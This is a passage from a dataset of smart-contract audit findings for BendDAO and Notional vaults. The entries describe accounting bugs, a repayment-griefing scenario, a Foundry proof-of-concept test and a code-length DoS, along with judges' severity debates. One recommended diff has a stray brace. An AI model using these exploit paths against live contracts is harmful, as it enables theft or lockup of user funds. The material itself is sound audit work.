tokenIds.length;\n  }\n\n  function erc721DecreaseIsolateSupply(\n    DataTypes.AssetData storage assetData,\n    address user,\n    uint256[] memory tokenIds\n  ) internal {\n    for (uint256 i = 0; i < tokenIds.length; i++) {\n      DataTypes.ERC721TokenData storage tokenData = assetData.erc721TokenData[tokenIds[i]];\n      require(tokenData.supplyMode == Constants.SUPPLY_MODE_ISOLATE, Errors.INVALID_SUPPLY_MODE);\n\n      tokenData.owner = address(0);\n      tokenData.supplyMode = 0;\n+     tokenData.lockerAddr = address(0);\n    }\n\n    assetData.totalScaledIsolateSupply -= tokenIds.length;\n    assetData.userScaledIsolateSupply[user] -= tokenIds.length;\n  }\n```\n\n### Assessed type\n\nContext\n\n**[thorseldon (BendDAO) confirmed and commented](https://github.com/code-423n4/2024-07-benddao-findings/issues/43#issuecomment-2297883896):**\n > Fixed [here](https://github.com/BendDAO/bend-v2/commit/78f41c84f404d58a31e8e0e1bffc0d939817084c).\n\n**[0xTheC0der (judge) commented](https://github.com/code-423n4/2024-07-benddao-findings/issues/43#issuecomment-2299369864):**\n > > Other `Isolate` methods cannot be operated either.\n> \n> Points out other instances.\n\n***\n\n",
      "summary": "\nThis bug report describes an issue with the `erc721DecreaseIsolateSupplyOnLiquidate()` function in the `BVault` contract. This function does not properly clear the `lockerAddr` variable, which can cause problems when users try to deposit or withdraw NFTs. This bug can result in users being unable to retrieve their NFTs. The recommended mitigation is to add code to clear the `lockerAddr` variable in the affected functions. This bug has been confirmed and fixed by the BendDAO team. Other instances of this issue have been identified in other `Isolate` methods.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "BendDAO",
      "source_link": "https://code4rena.com/reports/2024-07-benddao",
      "github_link": "https://github.com/code-423n4/2024-07-benddao-findings/issues/43",
      "tags": [],
      "finders": [
        "bin2chen",
        "oakcobalt"
      ]
    },
    {
      "id": "36876",
      "title": "[H-02] `isolateRepay()` lack of check `onBehalf == nftOwner`",
      "impact": "HIGH",
      "content": "\nWhen calling `isolateRepay()` we can specify `nftTokenIds` and `onBehalf`.\nThe current implementation just restricts `onBehalf!=address(0)` and does not restrict `onBehalf == nftOwner`.\n\n```solidity\n  function validateIsolateRepayBasic(\n    InputTypes.ExecuteIsolateRepayParams memory inputParams,\n    DataTypes.PoolData storage poolData,\n    DataTypes.AssetData storage debtAssetData,\n    DataTypes.AssetData storage nftAssetData\n  ) internal view {\n    validatePoolBasic(poolData);\n\n    validateAssetBasic(debtAssetData);\n    require(debtAssetData.assetType == Constants.ASSET_TYPE_ERC20, Errors.ASSET_TYPE_NOT_ERC20);\n\n    validateAssetBasic(nftAssetData);\n    require(nftAssetData.assetType == Constants.ASSET_TYPE_ERC721, Errors.ASSET_TYPE_NOT_ERC721);\n\n@>  require(inputParams.onBehalf != address(0), Errors.INVALID_ONBEHALF_ADDRESS);\n\n    require(inputParams.nftTokenIds.length > 0, Errors.INVALID_ID_LIST);\n    require(inputParams.nftTokenIds.length == inputParams.amounts.length, Errors.INCONSISTENT_PARAMS_LENGTH);\n    validateArrayDuplicateUInt256(inputParams.nftTokenIds);\n\n    for (uint256 i = 0; i < inputParams.amounts.length; i++) {\n      require(inputParams.amounts[i] > 0, Errors.INVALID_AMOUNT);\n    }\n  }\n```\n\nThis way, we can maliciously specify `onBehalf!=nftOwner` and when the method is executed `userScaledIsolateBorrow[onBehalf]` will be maliciously reduced. When the victim makes a real repayment or is liquidated, it will not be repaid or liquidated due to insufficient `userScaledIsolateBorrow[onBehalf]` resulting in an `underflow`.\n\nExample:\n1. Alice depositERC721(NFT\\_1).\n2. Bob depositERC721(NFT\\_2).\n3. Alice isolateBorrow(NFT\\_1, 100).\n   -  userScaledIsolateBorrow\\[alice] = 100\n   -  loanData\\[NFT\\_1].scaledAmount = 100\n4. Bob isolateBorrow(NFT\\_2, 100)\n   - userScaledIsolateBorrow\\[bob] = 100\n   - loanData\\[NFT\\_2].scaledAmount = 100\n5. Alice malicious repay, isolateRepay(NFT\\_1,amounts = 1, onBehalf = bob)\n   - userScaledIsolateBorrow\\[bob] = 99\n6. When NFT\\_2 be liquidated, isolateLiquidate(NFT\\_2)\n   - userScaledIsolateBorrow\\[bob] = loanData\\[NFT\\_2].scaledAmount = 99 - 100 =====> underflow.\n\n*Note: `isolateRedeem()` is similar.*\n\n### Impact\n\nMaliciously prevent being liquidated or repaid.\n\n### Recommended Mitigation\n\nlimit `onBehalf==owner`:\n\n```diff\n  function validateIsolateRepayBasic(\n    InputTypes.ExecuteIsolateRepayParams memory inputParams,\n    DataTypes.PoolData storage poolData,\n    DataTypes.AssetData storage debtAssetData,\n    DataTypes.AssetData storage nftAssetData\n  ) internal view {\n    validatePoolBasic(poolData);\n\n    validateAssetBasic(debtAssetData);\n    require(debtAssetData.assetType == Constants.ASSET_TYPE_ERC20, Errors.ASSET_TYPE_NOT_ERC20);\n\n    validateAssetBasic(nftAssetData);\n    require(nftAssetData.assetType == Constants.ASSET_TYPE_ERC721, Errors.ASSET_TYPE_NOT_ERC721);\n\n    require(inputParams.onBehalf != address(0), Errors.INVALID_ONBEHALF_ADDRESS);\n\n    require(inputParams.nftTokenIds.length > 0, Errors.INVALID_ID_LIST);\n    require(inputParams.nftTokenIds.length == inputParams.amounts.length, Errors.INCONSISTENT_PARAMS_LENGTH);\n    validateArrayDuplicateUInt256(inputParams.nftTokenIds);\n\n    for (uint256 i = 0; i < inputParams.amounts.length; i++) {\n      require(inputParams.amounts[i] > 0, Errors.INVALID_AMOUNT);\n\n+     DataTypes.ERC721TokenData storage tokenData = VaultLogic.erc721GetTokenData(\n+       nftAssetData,\n+       inputParams.nftTokenIds[i]\n+     );\n+     require(tokenData.owner == inputParams.onBehalf, Errors.ISOLATE_LOAN_OWNER_NOT_MATCH);\n    }\n  }\n```\n\n### Assessed type\n\nContext\n\n**[thorseldon (BendDAO) confirmed and commented](https://github.com/code-423n4/2024-07-benddao-findings/issues/44#issuecomment-2297884205):**\n > Fixed [here](https://github.com/BendDAO/bend-v2/commit/83b544354ec1dd2d630ceda347e0cefabd17d677).\n\n***\n\n",
      "summary": "\nThe bug report discusses an issue with the `isolateRepay()` function, which allows users to specify `nftTokenIds` and `onBehalf` when making a repayment. However, the current implementation does not restrict the `onBehalf` address to be the same as the NFT owner. This can be exploited by maliciously setting `onBehalf` to be different from the NFT owner, resulting in an `underflow` when the victim is liquidated or makes a repayment. This can prevent the victim from being repaid or liquidated. The recommended mitigation is to limit `onBehalf` to be the same as the NFT owner. The bug has been confirmed and fixed by the BendDAO team.",
      "quality_score": 4,
      "rarity_score": 3,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "BendDAO",
      "source_link": "https://code4rena.com/reports/2024-07-benddao",
      "github_link": "https://github.com/code-423n4/2024-07-benddao-findings/issues/44",
      "tags": [],
      "finders": [
        "bin2chen"
      ]
    },
    {
      "id": "36875",
      "title": "[H-01] Mismatch between yield amount deposited in shares calculation and `getAccountYieldBalance()`",
      "impact": "HIGH",
      "content": "\nMismatch between the return amount in all yield Etherfi and Lido assets and the `getAccountYieldBalance()` call causes the yield amount of each staked nft to the same `YieldAccount` to be incorrect, leading to the possibility of withdrawing the excess for some nfts while being closer to liquidation on others\n\n### Proof of Concept\n\nThe issue stems from the fact that in `YieldStakingBase::stake()`, on deposit of the borrowed amount to the corresponding yield source (Etherfi or Lido), it returns the minted shares of each integration [Etherfi](https://github.com/etherfi-protocol/smart-contracts/blob/master/src/LiquidityPool.sol#L529C25-L529C48) and [Lido](https://github.com/lidofinance/lido-dao/blob/master/contracts/0.4.24/Lido.sol#L946). As all these integrations shares increase in value over time, on each deposit, less shares than the deposited `ETH` are minted. This will be problematic because `YieldStakingBase` uses the returned shares value from depositing as if they were assets, [here](https://github.com/code-423n4/2024-07-benddao/blob/main/src/yield/YieldStakingBase.sol#L253). But then, it calculates `totalAssets` to compute the yield using the actual ETH balance of the positions [Etherfi](https://github.com/code-423n4/2024-07-benddao/blob/main/src/yield/etherfi/YieldEthStakingEtherfi.sol#L121), [Lido](https://github.com/code-423n4/2024-07-benddao/blob/main/src/yield/lido/YieldEthStakingLido.sol#L121).\n\nDue to this, if more than 1 nft is deposited, the borrowed amount and the yield amount will differ significantly. The first staked nft will have a bigger yield amount that can be claimed immediately and the following nfts will have instant losses that may end up being liquidated.\n\nReplace the `MockEtherfiLiquidityPool` deposit logic to mimic the real behaviour. It is the same as having an assets/shares ratio in Etherfi of 0.9:\n\n```solidity\nfunction deposit() external payable override returns (uint256) {\n  require(msg.value > 0, 'msg value is 0');\n\n  MockeETH(payable(eETH)).mint(msg.sender, msg.value);\n  return msg.value * 9 / 10;\n}\n```\n\nPlace the following test in `YieldEthStakingEtherfi.t.sol`. The yield amount of each staked nft is different, but the borrowed amounts are the same.\n\n```solidity\nfunction test_POC_Incorrect_Yield_tracking() public {\n  YieldTestVars memory testVars;\n\n  prepareWETH(tsDepositor1);\n\n  uint256[] memory tokenIds = prepareIsolateBAYC(tsBorrower1);\n\n  uint256 stakeAmount = tsYieldEthStakingEtherfi.getNftValueInUnderlyingAsset(address(tsBAYC));\n  stakeAmount = (stakeAmount * 80) / 100;\n\n  tsHEVM.prank(address(tsBorrower1));\n  address yieldAccount = tsYieldEthStakingEtherfi.createYieldAccount(address(tsBorrower1));\n\n  tsHEVM.prank(address(tsBorrower1));\n  tsYieldEthStakingEtherfi.stake(tsCommonPoolId, address(tsBAYC), tokenIds[0], stakeAmount);\n\n  tsHEVM.prank(address(tsBorrower1));\n  tsYieldEthStakingEtherfi.stake(tsCommonPoolId, address(tsBAYC), tokenIds[1], stakeAmount);\n\n  (testVars.poolId, testVars.state, testVars.debtAmount, testVars.yieldAmount) = tsYieldEthStakingEtherfi\n    .getNftStakeData(address(tsBAYC), tokenIds[0]);\n\n  assertEq(testVars.yieldAmount, 23433454429562988687);\n\n  (testVars.poolId, testVars.state, testVars.debtAmount, testVars.yieldAmount) = tsYieldEthStakingEtherfi\n    .getNftStakeData(address(tsBAYC), tokenIds[1]);\n\n  assertEq(testVars.yieldAmount, 21090108986606689816);\n}\n```\n\n### Tools Used\n\nVscode, Foundry\n\n### Recommended Mitigation Steps\n\nOn `YieldStakingBase::deposit()` the claimed amount should be the assets deposited (roughly equal to the borrowed amount minus rounding errors).\n\n**[thorseldon (BendDAO) confirmed and commented](https://github.com/code-423n4/2024-07-benddao-findings/issues/62#issuecomment-2297904422):**\n > Fixed [here](https://github.com/BendDAO/bend-v2/commit/64051b753c3e16b1e7454f258e4c84fbf1effd0e) and [here](https://github.com/BendDAO/bend-v2/commit/9525d8eb917981e50f9a96210695d016e42a6e3a).\n\n***\n\n",
      "summary": "\nThis bug report highlights a mismatch between the return amount in all yield Etherfi and Lido assets and the `getAccountYieldBalance()` call, causing incorrect yield amounts for staked NFTs and the possibility of withdrawing excess funds for some NFTs while being closer to liquidation for others. This is due to an issue in the `YieldStakingBase::stake()` function where the returned shares value is used as assets, but the actual ETH balance of the positions is used to compute the yield. A proof of concept and recommended mitigation steps are provided. The bug has been fixed in the BendDAO repository.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "BendDAO",
      "source_link": "https://code4rena.com/reports/2024-07-benddao",
      "github_link": "https://github.com/code-423n4/2024-07-benddao-findings/issues/62",
      "tags": [],
      "finders": [
        "0x73696d616f",
        "1",
        "2"
      ]
    },
    {
      "id": "35132",
      "title": "M-6: The _getValueOfWithdrawRequest function uses different methods for selecting assets in various vaults.",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2024-06-leveraged-vaults-judging/issues/80 \n\n## Found by \nZeroTrust\n\n## Summary\nThe _getValueOfWithdrawRequest function uses different methods for selecting assets in various vaults.\n## Vulnerability Detail\n```javascript\n function _getValueOfWithdrawRequest(\n        WithdrawRequest memory w, uint256 /* */\n    ) internal override view returns (uint256) {\n        uint256 tokenOutSY = getTokenOutSYForWithdrawRequest(w.requestId);\n        // NOTE: in this vault the tokenOutSy is known to be weETH.\n        (int256 weETHPrice, /* */) = TRADING_MODULE.getOraclePrice(TOKEN_OUT_SY, BORROW_TOKEN);\n@>>        return (tokenOutSY * weETHPrice.toUint() * BORROW_PRECISION) /\n            (WETH_PRECISION * Constants.EXCHANGE_RATE_PRECISION);\n    }\n```\nIn PendlePTEtherFiVault, weETH is used to withdraw eETH from the EtherFi protocol. Since eETH is still in a waiting period, the value of the withdrawal request is calculated using the price and quantity of weETH.\n```javascript\nfunction _getValueOfWithdrawRequest(\n        WithdrawRequest memory w,\n        address borrowToken,\n        uint256 borrowPrecision\n    ) internal view returns (uint256) {\n        address holder = address(uint160(w.requestId));\n\n        uint256 expectedStETHAmount;\n        if (KelpCooldownHolder(payable(holder)).triggered()) {\n            uint256[] memory requestIds = LidoWithdraw.getWithdrawalRequests(holder);\n            ILidoWithdraw.WithdrawalRequestStatus[] memory withdrawsStatus = LidoWithdraw.getWithdrawalStatus(requestIds);\n\n            expectedStETHAmount = withdrawsStatus[0].amountOfStETH;\n        } else {\n@>>            (/* */, expectedStETHAmount, /* */, /* */) = WithdrawManager.getUserWithdrawalRequest(stETH, holder, 0);\n\n        }\n\n        (int256 stETHToBorrowRate, /* */) = Deployments.TRADING_MODULE.getOraclePrice(\n            address(stETH), borrowToken\n        );\n\n        return (expectedStETHAmount * stETHToBorrowRate.toUint() * borrowPrecision) /\n            (Constants.EXCHANGE_RATE_PRECISION * stETH_PRECISION);\n    }\n```\nHowever, in PendlePTKelpVault, rsETH is used to withdraw stETH from the Kelp protocol. Similarly Since stETH is still in a waiting period, But the value of the withdrawal request is calculated using the expected amount and price of stETH(not rsETH).\n```javascript\n   function _getValueOfWithdrawRequest(\n        WithdrawRequest memory w,\n        address borrowToken,\n        uint256 borrowPrecision\n    ) internal view returns (uint256) {\n        address holder = address(uint160(w.requestId));\n        // This valuation is the amount of USDe the account will receive at cooldown, once\n        // a cooldown is initiated the account is no longer receiving sUSDe yield. This balance\n        // of USDe is transferred to a Silo contract and guaranteed to be available once the\n        // cooldown has passed.\n        IsUSDe.UserCooldown memory userCooldown = sUSDe.cooldowns(holder);\n\n        int256 usdeToBorrowRate;\n        if (borrowToken == address(USDe)) {\n            usdeToBorrowRate = int256(Constants.EXCHANGE_RATE_PRECISION);\n        } else {\n            // If not borrowing USDe, convert to the borrowed token\n            (usdeToBorrowRate, /* */) = Deployments.TRADING_MODULE.getOraclePrice(\n                address(USDe), borrowToken\n            );\n        }\n\n@>>        return (userCooldown.underlyingAmount * usdeToBorrowRate.toUint() * borrowPrecision) /\n            (Constants.EXCHANGE_RATE_PRECISION * USDE_PRECISION);\n    }\n```\nSimilarly, in PendlePTStakedUSDeVault, sUSDe is used to withdraw USDe from the Ethena protocol. Since USDe is still in a waiting period, the value of the withdrawal request is calculated using the expected amount and price of USDe(not sUSDe).\n\nTo summarize, PendlePTEtherFiVault uses the asset’s value before redemption for the calculation, while the other two vaults use the expected asset value after redemption. One of these methods is incorrect. The incorrect calculation method affects the asset value assessment of users in the fund, which in turn impacts whether a user should be liquidated.\n## Impact\nThe incorrect calculation method affects the asset value assessment of users in the fund, which in turn impacts whether a user should be liquidated.\n## Code Snippet\nhttps://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/14d3eaf0445c251c52c86ce88a84a3f5b9dfad94/leveraged-vaults-private/contracts/vaults/staking/PendlePTEtherFiVault.sol#L46\n\nhttps://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/contracts/vaults/staking/protocols/Kelp.sol#L114\n\nhttps://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/contracts/vaults/staking/protocols/Ethena.sol#L77\n## Tool used\n\nManual Review\n\n## Recommendation\nChoose a consistent approach for value assessment, either using the token before withdrawal or the token received after withdrawal.\n\n\n\n## Discussion\n\n**T-Woodward**\n\nThe watson has correctly pointed out an inconsistency in the valuation methodology for withdrawal requests in these different vaults, but that inconsistency in and of itself is not a vulnerability.\n\nHe asserts that because we use two different methodologies, one must be wrong and one must be right. Therefore, he has shown that we have done something wrong with a critical part of the code and he deserves a bounty.\n\nThis line of reasoning is flawed. Neither approach is right, and neither is wrong. There is not an objectively correct way to value these withdrawal requests. For this to be a valid finding, we would need to see evidence that one of these valuation methodologies is actually exploitable / results in negative consequences. The watson has not shown that.\n\nWhile consistency in this valuation methodology would be generally preferable, these are all different vaults with different assets that work different ways. The valuation methodology should match the problem at hand and should not just be consistent for the sake of consistency.\n\nHOWEVER, having said all this, I looked further into the rsETH withdrawal request valuation and have concluded that we should change it because rsETH is slashable before it resolves to stETH, just like weETH. So in this case, we should switch the valuation methodology to match weETH. The sUSDe methodology still makes sense imo though because once the cooldown has started you know exactly how many USDe you will get and that won't change.\n\nI'm not sure whether the watson deserves credit here. If we hadn't found the rsETH thing, I would have said no. But we did find the rsETH thing because of this issue report even though the watson didn't find it himself. Will let the judge decide.\n\n**T-Woodward**\n\nThink that if the watson does get a valid finding out of this, should be a medium severity at most. Once an account is in the withdrawal queue their account is locked until the withdrawal finalizes, so there's no way they could take advantage of a mispricing anyway.\n\n**mystery0x**\n\nChanging it to medium severity in light of the sponsor's detailed reasonings.\n\n**Hash01011122**\n\n@mystery0x isn't this dup of #60 as root cause is same? Correct me if I am wrong\n\n**mystery0x**\n\n> @mystery0x isn't this dup of #60 as root cause is same? Correct me if I am wrong\n\nI think they are two different flaws/exploit stemming from different root cause. This one talking about inconsistencies of withdrawal request whereas #60 deals with decimals normalization/scaling issue.\n\n**Hash01011122**\n\nAs far as I understand, this issue points out:\n>PendlePTEtherFiVault uses the asset’s value before redemption for the calculation, while the other two vaults use the expected asset value after redemption.\n>>PendlePTStakedUSDeVault, sUSDe is used to withdraw USDe from the Ethena protocol. Since USDe is still in a waiting period, the value of the withdrawal request is calculated using the expected amount and price of USDe(not sUSDe).\n\nWhich is regarding different assets consideration while calculating the withdrawal.\n\nWhile 60th issue is:\n> `BT` be the borrowed token with 6 decimal precision, and `RT` be the redemption token with 18 decimal precision\n\nWhich is too about lack of consideration by protocol of using different assest tokens which lead to improper precision while calculating splitwithdrawal request.\n\n**Commonality:** Incorrect implementation of before and after asset tokens.\n\nI might be wrong here, but it would be better to recheck this two issues. @mystery0x, let me know your thoughts.\n\n**T-Woodward**\n\nIn my opinion these are totally different issues\n\n**0502lian**\n\n> The watson has correctly pointed out an inconsistency in the valuation methodology for withdrawal requests in these different vaults, but that inconsistency in and of itself is not a vulnerability.\n> \n> He asserts that because we use two different methodologies, one must be wrong and one must be right. Therefore, he has shown that we have done something wrong with a critical part of the code and he deserves a bounty.\n> \n> This line of reasoning is flawed. Neither approach is right, and neither is wrong. There is not an objectively correct way to value these withdrawal requests. For this to be a valid finding, we would need to see evidence that one of these valuation methodologies is actually exploitable / results in negative consequences. The watson has not shown that.\n> \n> While consistency in this valuation methodology would be generally preferable, these are all different vaults with different assets that work different ways. The valuation methodology should match the problem at hand and should not just be consistent for the sake of consistency.\n> \n> HOWEVER, having said all this, I looked further into the rsETH withdrawal request valuation and have concluded that we should change it because rsETH is slashable before it resolves to stETH, just like weETH. So in this case, we should switch the valuation methodology to match weETH. The sUSDe methodology still makes sense imo though because once the cooldown has started you know exactly how many USDe you will get and that won't change.\n> \n> I'm not sure whether the watson deserves credit here. If we hadn't found the rsETH thing, I would have said no. But we did find the rsETH thing because of this issue report even though the watson didn't find it himself. Will let the judge decide.\n\n\nThanks to the sponsor for such a detailed explanation; what he said is factual.\nI would like to add:\n- (1) I am indeed aware that the value of LSTs/LRTs tokens (including rsETH) can fluctuate, sometimes even dramatically, which is why I raised an  [issue113](https://github.com/sherlock-audit/2024-06-leveraged-vaults-judging/issues/113) about the fluctuation in the value of LSTs/LRTs tokens. \nThe expectedAssetAmount is merely an expected value calculated based on the value of rsETH at the time of initiating a withdrawal, not the actual number of stETH finally withdrawn. It can not be used for the value of withdraw request.\nAt that time, I should have included more detailed impacts of rsETH value fluctuations in this issue. Indeed, the Impact section in the report needs further enhancement.\n- (2) Usually, during the Judge Contest phase, the Lead Judge for less clear issues will ask The Watson to provide a more detailed PoC. I don’t know why this Contest did not ask any Watson to provide one. If there had been such an opportunity, The Watson could have had the chance to add what they know.\n\nI agree to let the Sherlock judge make the final decision.",
      "summary": "\nThe report highlights an inconsistency in the _getValueOfWithdrawRequest function in different vaults. The function uses different methods for selecting assets, causing a discrepancy in asset value assessment. This can impact whether a user is liquidated. The issue is caused by the use of different assets and their values before or after redemption. The report recommends choosing a consistent approach for value assessment and provides code snippets and detailed discussion on the issue. The impact and vulnerability detail sections may need further clarification. The issue was found through manual review and the sponsor has provided a detailed explanation and potential solution. The report will be judged by the Sherlock team.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Notional Leveraged Vaults: Pendle PT and Vault Incentives",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-06-leveraged-vaults-judging/issues/80",
      "tags": [],
      "finders": [
        "ZeroTrust"
      ]
    },
    {
      "id": "35131",
      "title": "M-5: Protocol could be DOS by transfer error due to lack of code length check",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2024-06-leveraged-vaults-judging/issues/73 \n\n## Found by \nxiaoming90\n## Summary\n\nThe protocol could be DOS due to inadequate handling of transfer errors as it does not perform code length check. As a result, many critical features such as deposit, redemption, and liquidation will be broken, leading to assets being stuck or lost of assets.\n\n## Vulnerability Detail\n\nPer the comment at Lines 312-315 below, the transfer error must be ignored to ensure that the error does not prevent normal vault operations from working. This is crucial because many critical features such as deposit, redemption, and liquidation will revert if the error is not handled properly, which could lead to assets being stuck or loss of assets.\n\nhttps://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/contracts/vaults/common/VaultRewarderLib.sol#L316\n\n```solidity\nFile: VaultRewarderLib.sol\n311:         if (0 < rewardToClaim) {\n312:             // Ignore transfer errors here so that any strange failures here do not\n313:             // prevent normal vault operations from working. Failures may include a\n314:             // lack of balances or some sort of blacklist that prevents an account\n315:             // from receiving tokens.\n316:             try IEIP20NonStandard(rewardToken).transfer(account, rewardToClaim) {\n317:                 bool success = TokenUtils.checkReturnCode();\n318:                 if (success) {\n319:                     emit VaultRewardTransfer(rewardToken, account, rewardToClaim);\n320:                 } else {\n321:                     emit VaultRewardTransfer(rewardToken, account, 0);\n322:                 }\n323:             // Emits zero tokens transferred if the transfer fails.\n324:             } catch {\n325:                 emit VaultRewardTransfer(rewardToken, account, 0);\n326:             }\n327:         }\n```\n\nLine 326 above attempts to mitigate the transfer error by \"wrapping\" the transfer call within the try-catch block. If the `transfer` function reverts, it will not revert the entire transaction and break the critical features of the protocol.\n\nHowever, this approach was found to be insufficient to mitigate all cases of transfer error. There is still an edge case where an error could occur during transfer, reverting the entire transaction.\n\nIf the `rewardToken` points to an address that does not contain any code (codesize == 0), the transaction will revert instead of going into the try-catch block due to how Solidity works. It is possible that some reward tokens may contain self-destruct feature for certain reasons, resulting in the codesize becoming zero at some point in time.\n\n## Impact\n\nIf the edge case occurs, many critical features such as deposit, redemption, and liquidation will be broken, leading to assets being stuck or lost of assets.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/contracts/vaults/common/VaultRewarderLib.sol#L316\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nEnsure that the transfer error does not revert the entire transaction under any circumstance. Consider implementing the following changes:\n\n```diff\n        if (0 < rewardToClaim) {\n            // Ignore transfer errors here so that any strange failures here do not\n            // prevent normal vault operations from working. Failures may include a\n            // lack of balances or some sort of blacklist that prevents an account\n            // from receiving tokens.\n+           if (rewardToken.code.length > 0) {}\n              try IEIP20NonStandard(rewardToken).transfer(account, rewardToClaim) {\n                  bool success = TokenUtils.checkReturnCode();\n                  if (success) {\n                      emit VaultRewardTransfer(rewardToken, account, rewardToClaim);\n                  } else {\n                      emit VaultRewardTransfer(rewardToken, account, 0);\n                  }\n              // Emits zero tokens transferred if the transfer fails.\n              } catch {\n                  emit VaultRewardTransfer(rewardToken, account, 0);\n              }\n+           }\n        }\n```\n\n\n\n## Discussion\n\n**sherlock-admin4**\n\n1 comment(s) were left on this issue during the judging contest.\n\n**0xmystery** commented:\n>  Low/QA at most\n\n\n\n**xiaoming9090**\n\nEscalate.\n\nThis issue should be a Medium.\n\nAlthough the probability of encountering such a reward token is low, it is still possible for such a scenario to occur (edge case). If it happens, the impact will be serious, causing many critical features such as deposit, redemption, and liquidation to be broken, leading to assets being stuck or lost of assets.\n\nPer Sherlock's judging rules, issues that require certain external conditions or specific states that could lead to a loss of assets should be judged as Medium, which should be the case here:\n\n> 1. Causes a loss of funds but **requires certain external conditions or specific states**, or a loss is highly constrained. The losses must exceed small, finite amount of funds, and any amount relevant based on the precision or significance of the loss.\n\n**sherlock-admin3**\n\n> Escalate.\n> \n> This issue should be a Medium.\n> \n> Although the probability of encountering such a reward token is low, it is still possible for such a scenario to occur (edge case). If it happens, the impact will be serious, causing many critical features such as deposit, redemption, and liquidation to be broken, leading to assets being stuck or lost of assets.\n> \n> Per Sherlock's judging rules, issues that require certain external conditions or specific states that could lead to a loss of assets should be judged as Medium, which should be the case here:\n> \n> > 1. Causes a loss of funds but **requires certain external conditions or specific states**, or a loss is highly constrained. The losses must exceed small, finite amount of funds, and any amount relevant based on the precision or significance of the loss.\n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**mystery0x**\n\n> Escalate.\n> \n> This issue should be a Medium.\n> \n> Although the probability of encountering such a reward token is low, it is still possible for such a scenario to occur (edge case). If it happens, the impact will be serious, causing many critical features such as deposit, redemption, and liquidation to be broken, leading to assets being stuck or lost of assets.\n> \n> Per Sherlock's judging rules, issues that require certain external conditions or specific states that could lead to a loss of assets should be judged as Medium, which should be the case here:\n> \n> > 1. Causes a loss of funds but **requires certain external conditions or specific states**, or a loss is highly constrained. The losses must exceed small, finite amount of funds, and any amount relevant based on the precision or significance of the loss.\n\nWill have the sponsors look into this finding... but it seems to me that making sure `rewardToken.code.length != 0` is a low issue equivalent to sanity check on zero value/address.\n\nAdditionally, `0 < rewardToClaim` signifies that `rewardToken` is already intact assuredly having `rewardToken.code.length > 0`:\n\nhttps://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/contracts/vaults/common/VaultRewarderLib.sol#L302-L304\n\n```\n        rewardToClaim = _getRewardsToClaim(\n            rewardToken, account, vaultSharesBefore, rewardsPerVaultShare\n        );\n``` \n\n**WangSecurity**\n\nThe first question is, who sets the reward tokens? Notional admins, correct?\n\nSecondly, if the reward token's contract was self-destructed, it wouldn't be even possible to withdraw such rewards. So with or without the try/catch block it leads to a loss of funds?\n\nThirdly, this destructed token can be replaced, correct?\n\nFourthly, I see code comments saying that the code should ignore reverts, but need to remark, that breaking statements from the code comments, doesn't mean the issue automatically warrants medium severity.\n\n**WangSecurity**\n\n@xiaoming9090 looking deeper into this issue, I'm unsure the reward tokens can be replaced, which leads to users not being able to get the reward tokens at all, correct? But it's only possible if the reward token has the `selfdestruct` opcode?\n\n\n**xiaoming9090**\n\n@WangSecurity \n\n> looking deeper into this issue, I'm unsure the reward tokens can be replaced, which leads to users not being able to get the reward tokens at all, correct? But it's only possible if the reward token has the selfdestruct opcode?\n\nAs stated in the comments [here](https://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/14d3eaf0445c251c52c86ce88a84a3f5b9dfad94/leveraged-vaults-private/contracts/vaults/common/VaultRewarderLib.sol#L87) or you may refer to the implementation of the [`updateRewardToken`](https://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/14d3eaf0445c251c52c86ce88a84a3f5b9dfad94/leveraged-vaults-private/contracts/vaults/common/VaultRewarderLib.sol#L68C14-L68C31) function, once a reward token is set, the address of the reward token can never be changed. Only the emission rate can be updated.\n\nHowever, the main concern that I'm trying to highlight in this report is not the loss of reward tokens, but DOS or the breaking of the protocol's core functionality.\n\nThe sponsor went to great lengths to ensure that the token transfer would never revert under any circumstance. One has to understand why the sponsor makes such a great effort to do so and is even willing to forgo the reward tokens to ensure the continuity of the protocol. The reason is that if the token transfer reverts, for whatever reason, the entire protocol will be brick because the deposit, redeem, and liquidation (core) features rely on this claim reward function.\n\nThus, naturally, one would review whether the sponsor's current approach will cover all the edge cases. It was found that there is an edge case if a reward token self-destructs. The reward token's code will be empty, and the token transfer will revert, resulting in the deposit, redemption and liquidation (core) features being broken.\n\n```solidity\n        if (0 < rewardToClaim) {\n            // Ignore transfer errors here so that any strange failures here do not\n            // prevent normal vault operations from working. Failures may include a\n            // lack of balances or some sort of blacklist that prevents an account\n            // from receiving tokens.\n            try IEIP20NonStandard(rewardToken).transfer(account, rewardToClaim) {\n                bool success = TokenUtils.checkReturnCode();\n                if (success) {\n                    emit VaultRewardTransfer(rewardToken, account, rewardToClaim);\n                } else {\n                    emit VaultRewardTransfer(rewardToken, account, 0);\n                }\n            // Emits zero tokens transferred if the transfer fails.\n            } catch {\n                emit VaultRewardTransfer(rewardToken, account, 0);\n            }\n        }\n```\n\n\n\n**WangSecurity**\n\nThank you for that clarification. \n\nAgree with the escalation, planning to accept it with medium severity.\n\n**WangSecurity**\n\nResult:\nMedium\nUnique \n\n**sherlock-admin2**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [xiaoming9090](https://github.com/sherlock-audit/2024-06-leveraged-vaults-judging/issues/73/#issuecomment-2227180121): accepted\n\n**WangSecurity**\n\n@xiaoming9090 @mystery0x 